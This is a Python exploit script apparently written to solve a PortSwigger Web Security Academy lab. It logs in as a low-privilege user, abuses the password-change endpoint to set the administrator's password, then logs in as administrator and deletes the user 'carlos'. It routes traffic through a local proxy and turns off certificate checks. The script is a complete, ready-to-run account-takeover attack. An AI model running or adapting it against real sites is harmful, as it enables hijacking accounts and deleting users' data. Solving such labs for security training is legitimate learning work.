from bs4 import BeautifulSoup
from urllib.parse import urljoin
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define Proxies
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Get CSRF Token
def get_csrf_token(session, url):
  response = session.get(url, proxies=proxies, verify=False)
  csrf_token = BeautifulSoup(response.text, 'html.parser').find('input', {'name': 'csrf'}).get('value')
  return csrf_token

def exploit(session, base_url):
  login_url = urljoin(base_url, '/login')
  login_csrf_token = get_csrf_token(session, login_url)
  login_payload = {'username': 'wiener', 'password': 'peter', 'csrf': login_csrf_token}
  login_response = session.post(login_url, data=login_payload, proxies=proxies, verify=False)
  if login_response.status_code == 200:
    account_url = base_url + '/my-account'
    change_password_url = base_url + '/my-account/change-password'
    csrf_token = get_csrf_token(session, account_url)
    data = {
      'username': 'administrator',
      'new-password-1': '4l@w3)',
      'new-password-2': '4l@w3)',
      'csrf': csrf_token
    }
    response = session.post(change_password_url, data=data, verify=False)
    if response.status_code == 200:
      # Call delete_user function
      delete_user(session, base_url, 'carlos')
      print("Carlos User Deleted!")
    else:
      print("Failed to delete Carlos User")
  else:
    print("Failed to log in.")

def delete_user(session, base_url, username):
  login_url = urljoin(base_url, '/login')
  login_csrf_token = get_csrf_token(session, login_url)
  login_payload = {'username': 'administrator', 'password': '4l@w3)', 'csrf': login_csrf_token}
  login_response = session.post(login_url, data=login_payload, proxies=proxies, verify=False)
  if login_response.status_code == 200:
    admin_delete_url = base_url + f'/admin/delete?username={username}'
    response = session.get(admin_delete_url, verify=False)
    return response

def main():
  base_url = 'https://0a6900f304316c31819ecf1d004200a6.web-security-academy.net'
  session = requests.Session()
  exploit(session, base_url)

if __name__ == "__main__":
  main()